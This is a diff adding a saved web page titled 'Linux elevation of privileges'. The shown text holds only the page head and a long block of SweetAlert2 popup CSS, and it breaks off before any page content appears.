@@ -1,0 +1,1346 @@
+<!DOCTYPE html>
+<!-- saved from url=(0024)https://guif.re/linuxeop -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Linux elevation of privileges</title>
+        
+        <link rel="stylesheet" type="text/css" href="./Linux elevation of privileges_files/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://guif.re/assets/favicon.png">
+        <script async="" src="./Linux elevation of privileges_files/analytics.js.download"></script><script src="./Linux elevation of privileges_files/syntaxhighlighter.js.download"></script>
+    <style>@-webkit-keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@-webkit-keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@-webkit-keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@-webkit-keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@-webkit-keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@-webkit-keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@-webkit-keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
+  flex-direction: column;
+  align-items: stretch; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
+    flex: 1;
+    align-self: stretch;
+    justify-content: flex-end;
+    height: 2.2em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
+    justify-content: center; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
+    height: 2em;
+    margin: .3125em auto;
+    font-size: 1em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
+    font-size: 1em; }
+
+body.swal2-toast-shown > .swal2-container {
+  position: fixed;
+  background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-shown {
+    background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-top {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
+    top: 0;
+    right: 0;
+    bottom: auto;
+    left: auto; }
+  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
+    top: 50%;
+    right: 0;
+    bottom: auto;
+    left: auto;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
+    top: auto;
+    right: 0;
+    bottom: 0;
+    left: auto; }
+
+.swal2-popup.swal2-toast {
+  flex-direction: row;
+  align-items: center;
+  width: auto;
+  padding: 0.625em;
+  box-shadow: 0 0 0.625em #d9d9d9;
+  overflow-y: hidden; }
+  .swal2-popup.swal2-toast .swal2-header {
+    flex-direction: row; }
+  .swal2-popup.swal2-toast .swal2-title {
+    justify-content: flex-start;
+    margin: 0 .6em;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-close {
+    position: initial; }
+  .swal2-popup.swal2-toast .swal2-content {
+    justify-content: flex-start;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-icon {
+    width: 2em;
+    min-width: 2em;
+    height: 2em;
+    margin: 0; }
+    .swal2-popup.swal2-toast .swal2-icon-text {
+      font-size: 2em;
+      font-weight: bold;
+      line-height: 1em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      top: .875em;
+      width: 1.375em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: .3125em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: .3125em; }
+  .swal2-popup.swal2-toast .swal2-actions {
+    height: auto;
+    margin: 0 .3125em; }
+  .swal2-popup.swal2-toast .swal2-styled {
+    margin: 0 .3125em;
+    padding: .3125em .625em;
+    font-size: 1em; }
+    .swal2-popup.swal2-toast .swal2-styled:focus {
+      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
+  .swal2-popup.swal2-toast .swal2-success {
+    border-color: #a5dc86; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 2em;
+      height: 2.8125em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.25em;
+        left: -.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 2em 2em;
+                transform-origin: 2em 2em;
+        border-radius: 4em 0 0 4em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.25em;
+        left: .9375em;
+        -webkit-transform-origin: 0 2em;
+                transform-origin: 0 2em;
+        border-radius: 0 4em 4em 0; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+      top: 0;
+      left: .4375em;
+      width: .4375em;
+      height: 2.6875em; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
+      height: .3125em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 1.125em;
+        left: .1875em;
+        width: .75em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: .9375em;
+        right: .1875em;
+        width: 1.375em; }
+  .swal2-popup.swal2-toast.swal2-show {
+    -webkit-animation: showSweetToast .5s;
+            animation: showSweetToast .5s; }
+  .swal2-popup.swal2-toast.swal2-hide {
+    -webkit-animation: hideSweetToast .2s forwards;
+            animation: hideSweetToast .2s forwards; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
+    -webkit-animation: animate-toast-success-tip .75s;
+            animation: animate-toast-success-tip .75s; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
+    -webkit-animation: animate-toast-success-long .75s;
+            animation: animate-toast-success-long .75s; }
+
+@-webkit-keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@-webkit-keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@-webkit-keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@-webkit-keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+@keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
+body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+  height: auto;
+  overflow-y: hidden; }
+
+body.swal2-no-backdrop .swal2-shown {
+  top: auto;
+  right: auto;
+  bottom: auto;
+  left: auto;
+  background-color: transparent; }
+  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top {
+    top: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
+    top: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
+    top: 0;
+    right: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-center {
+    top: 50%;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
+    top: 50%;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
+    top: 50%;
+    right: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
+    bottom: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
+    right: 0;
+    bottom: 0; }
+
+.swal2-container {
+  display: flex;
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  flex-direction: row;
+  align-items: center;
+  justify-content: center;
+  padding: 10px;
+  background-color: transparent;
+  z-index: 1060;
+  overflow-x: hidden;
+  -webkit-overflow-scrolling: touch; }
+  .swal2-container.swal2-top {
+    align-items: flex-start; }
+  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
+    align-items: flex-start;
+    justify-content: flex-start; }
+  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
+    align-items: flex-start;
+    justify-content: flex-end; }
+  .swal2-container.swal2-center {
+    align-items: center; }
+  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
+    align-items: center;
+    justify-content: flex-start; }
+  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
+    align-items: center;
+    justify-content: flex-end; }
+  .swal2-container.swal2-bottom {
+    align-items: flex-end; }
+  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
+    align-items: flex-end;
+    justify-content: flex-start; }
+  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
+    align-items: flex-end;
+    justify-content: flex-end; }
+  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-self: stretch;
+    justify-content: center; }
+  .swal2-container.swal2-grow-row > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-content: center;
+    justify-content: center; }
+  .swal2-container.swal2-grow-column {
+    flex: 1;
+    flex-direction: column; }
+    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
+      align-items: center; }
+    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
+      align-items: flex-start; }
+    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
+      align-items: flex-end; }
+    .swal2-container.swal2-grow-column > .swal2-modal {
+      display: flex !important;
+      flex: 1;
+      align-content: center;
+      justify-content: center; }
+  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
+    margin: auto; }
+  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+    .swal2-container .swal2-modal {
+      margin: 0 !important; } }
+  .swal2-container.swal2-fade {
+    transition: background-color .1s; }
+  .swal2-container.swal2-shown {
+    background-color: rgba(0, 0, 0, 0.4); }
+
+.swal2-popup {
+  display: none;
+  position: relative;
+  flex-direction: column;
+  justify-content: center;
+  width: 32em;
+  max-width: 100%;
+  padding: 1.25em;
+  border-radius: 0.3125em;
+  background: #fff;
+  font-family: inherit;
+  font-size: 1rem;
+  box-sizing: border-box; }
+  .swal2-popup:focus {
+    outline: none; }
+  .swal2-popup.swal2-loading {
+    overflow-y: hidden; }
+  .swal2-popup .swal2-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center; }
+  .swal2-popup .swal2-title {
+    display: block;
+    position: relative;
+    max-width: 100%;
+    margin: 0 0 0.4em;
+    padding: 0;
+    color: #595959;
+    font-size: 1.875em;
+    font-weight: 600;
+    text-align: center;
+    text-transform: none;
+    word-wrap: break-word; }
+  .swal2-popup .swal2-actions {
+    align-items: center;
+    justify-content: center;
+    margin: 1.25em auto 0; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
+      opacity: .4; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
+      width: 2.5em;
+      height: 2.5em;
+      margin: .46875em;
+      padding: 0;
+      border: .25em solid transparent;
+      border-radius: 100%;
+      border-color: transparent;
+      background-color: transparent !important;
+      color: transparent;
+      cursor: default;
+      box-sizing: border-box;
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+      -webkit-user-select: none;
+         -moz-user-select: none;
+          -ms-user-select: none;
+              user-select: none; }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
+      margin-right: 30px;
+      margin-left: 30px; }
+    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      margin-left: 5px;
+      border: 3px solid #999999;
+      border-radius: 50%;
+      border-right-color: transparent;
+      box-shadow: 1px 1px 1px #fff;
+      content: '';
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
+  .swal2-popup .swal2-styled {
+    margin: 0 .3125em;
+    padding: .625em 2em;
+    font-weight: 500;
+    box-shadow: none; }
+    .swal2-popup .swal2-styled:not([disabled]) {
+      cursor: pointer; }
+    .swal2-popup .swal2-styled.swal2-confirm {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #3085d6;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled.swal2-cancel {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #aaa;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
+    .swal2-popup .swal2-styled::-moz-focus-inner {
+      border: 0; }
+  .swal2-popup .swal2-footer {
+    justify-content: center;
+    margin: 1.25em 0 0;
+    padding-top: 1em;
+    border-top: 1px solid #eee;
+    color: #545454;
+    font-size: 1em; }
+  .swal2-popup .swal2-image {
+    max-width: 100%;
+    margin: 1.25em auto; }
+  .swal2-popup .swal2-close {
+    position: absolute;
+    top: 0;
+    right: 0;
+    justify-content: center;
+    width: 1.2em;
+    min-width: 1.2em;
+    height: 1.2em;
+    margin: 0;
+    padding: 0;
+    transition: color 0.1s ease-out;
+    border: none;
+    border-radius: 0;
+    background: transparent;
+    color: #cccccc;
+    font-family: serif;
+    font-size: calc(2.5em - 0.25em);
+    line-height: 1.2em;
+    cursor: pointer; }
+    .swal2-popup .swal2-close:hover {
+      -webkit-transform: none;
+              transform: none;
+      color: #f27474; }
+  .swal2-popup > .swal2-input,
+  .swal2-popup > .swal2-file,
+  .swal2-popup > .swal2-textarea,
+  .swal2-popup > .swal2-select,
+  .swal2-popup > .swal2-radio,
+  .swal2-popup > .swal2-checkbox {
+    display: none; }
+  .swal2-popup .swal2-content {
+    justify-content: center;
+    margin: 0;
+    padding: 0;
+    color: #545454;
+    font-size: 1.125em;
+    font-weight: 300;
+    line-height: normal;
+    word-wrap: break-word; }
+  .swal2-popup #swal2-content {
+    text-align: center; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea,
+  .swal2-popup .swal2-select,
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    margin: 1em auto; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea {
+    width: 100%;
+    transition: border-color .3s, box-shadow .3s;
+    border: 1px solid #d9d9d9;
+    border-radius: 0.1875em;
+    font-size: 1.125em;
+    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
+    box-sizing: border-box; }
+    .swal2-popup .swal2-input.swal2-inputerror,
+    .swal2-popup .swal2-file.swal2-inputerror,
+    .swal2-popup .swal2-textarea.swal2-inputerror {
+      border-color: #f27474 !important;
+      box-shadow: 0 0 2px #f27474 !important; }
+    .swal2-popup .swal2-input:focus,
+    .swal2-popup .swal2-file:focus,
+    .swal2-popup .swal2-textarea:focus {
+      border: 1px solid #b4dbed;
+      outline: none;
+      box-shadow: 0 0 3px #c4e6f5; }
+    .swal2-popup .swal2-input::-webkit-input-placeholder,
+    .swal2-popup .swal2-file::-webkit-input-placeholder,
+    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input:-ms-input-placeholder,
+    .swal2-popup .swal2-file:-ms-input-placeholder,
+    .swal2-popup .swal2-textarea:-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::-ms-input-placeholder,
+    .swal2-popup .swal2-file::-ms-input-placeholder,
+    .swal2-popup .swal2-textarea::-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::placeholder,
+    .swal2-popup .swal2-file::placeholder,
+    .swal2-popup .swal2-textarea::placeholder {
+      color: #cccccc; }
+  .swal2-popup .swal2-range input {
+    width: 80%; }
+  .swal2-popup .swal2-range output {
+    width: 20%;
+    font-weight: 600;
+    text-align: center; }
+  .swal2-popup .swal2-range input,
+  .swal2-popup .swal2-range output {
+    height: 2.625em;
+    margin: 1em auto;
+    padding: 0;
+    font-size: 1.125em;
+    line-height: 2.625em; }
+  .swal2-popup .swal2-input {
+    height: 2.625em;
+    padding: 0.75em; }
+    .swal2-popup .swal2-input[type='number'] {
+      max-width: 10em; }
+  .swal2-popup .swal2-file {
+    font-size: 1.125em; }
+  .swal2-popup .swal2-textarea {
+    height: 6.75em;
+    padding: 0.75em; }
+  .swal2-popup .swal2-select {
+    min-width: 50%;
+    max-width: 100%;
+    padding: .375em .625em;
+    color: #545454;
+    font-size: 1.125em; }
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    align-items: center;
+    justify-content: center; }
+    .swal2-popup .swal2-radio label,
+    .swal2-popup .swal2-checkbox label {
+      margin: 0 .6em;
+      font-size: 1.125em; }
+    .swal2-popup .swal2-radio input,
+    .swal2-popup .swal2-checkbox input {
+      margin: 0 .4em; }
+  .swal2-popup .swal2-validationerror {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 0.625em;
+    background: #f0f0f0;
+    color: #666666;
+    font-size: 1em;
+    font-weight: 300;
+    overflow: hidden; }
+    .swal2-popup .swal2-validationerror::before {
+      display: inline-block;
+      width: 1.5em;
+      height: 1.5em;
+      margin: 0 .625em;
+      border-radius: 50%;
+      background-color: #f27474;
+      color: #fff;
+      font-weight: 600;
+      line-height: 1.5em;
+      text-align: center;
+      content: '!';
+      zoom: normal; }
+
+@supports (-ms-accelerator: true) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+.swal2-icon {
+  position: relative;
+  justify-content: center;
+  width: 5em;
+  height: 5em;
+  margin: 1.25em auto 1.875em;
+  border: .25em solid transparent;
+  border-radius: 50%;
+  line-height: 5em;
+  cursor: default;
+  box-sizing: content-box;
+  -webkit-user-select: none;
+     -moz-user-select: none;
+      -ms-user-select: none;
+          user-select: none;
+  zoom: normal; }
+  .swal2-icon-text {
+    font-size: 3.75em; }
+  .swal2-icon.swal2-error {
+    border-color: #f27474; }
+    .swal2-icon.swal2-error .swal2-x-mark {
+      position: relative;
+      flex-grow: 1; }
+    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      display: block;
+      position: absolute;
+      top: 2.3125em;
+      width: 2.9375em;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #f27474; }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: 1.0625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: 1em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+  .swal2-icon.swal2-warning {
+    border-color: #facea8;
